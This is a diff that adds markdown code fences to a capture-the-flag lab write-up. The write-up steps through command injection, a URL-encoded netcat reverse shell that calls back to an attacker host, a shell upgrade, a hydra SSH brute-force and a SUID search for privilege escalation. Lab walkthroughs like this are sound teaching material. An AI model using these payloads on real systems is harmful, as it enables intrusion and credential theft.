@@ -53,9 +53,9 @@ Always show details
 Download image:
 
 Always show details
-
+```
 wget http://10.10.115.169:22/header.jpg
-
+```
 Extract hidden file:
 
 Always show details
@@ -71,9 +71,9 @@ Discovered command injection at ?cmd=.
 Test:
 
 Always show details
-
+```
 http://10.10.115.169:22/nnxhweOV/?cmd=id
-
+```
 ### 5. Reverse Shell
 
 Start listener:
@@ -85,24 +85,24 @@ nc -lvnp 4444
 Payload (URL-encoded):
 
 Always show details
-
+```
 http://10.10.115.169:22/nnxhweOV/?cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202%3E%261|nc%2010.9.0.185%204444%20>%20/tmp/f
-
+```
 Got shell → upgraded with:
 
 Always show details
-
+```
 python3 -c 'import pty; pty.spawn("/bin/bash")'
-
+```
 ### 6. User Flag
 
 Found password list in /home/jack/.
 Brute-forced SSH on port 80:
 
 Always show details
-
+```
 hydra -l jack -P passwords.txt ssh://10.10.115.169:80
-
+```
 Logged in → user flag inside user.jpg:
 
 move user.jpg to your machine
@@ -114,9 +114,9 @@ flag: securi-tay2020_{********************}
 Check SUID binaries:
 
 Always show details
-
+````
 find / -perm -4000 -type f 2>/dev/null
-
+````
 Found /usr/bin/strings.
 Read root flag:
 
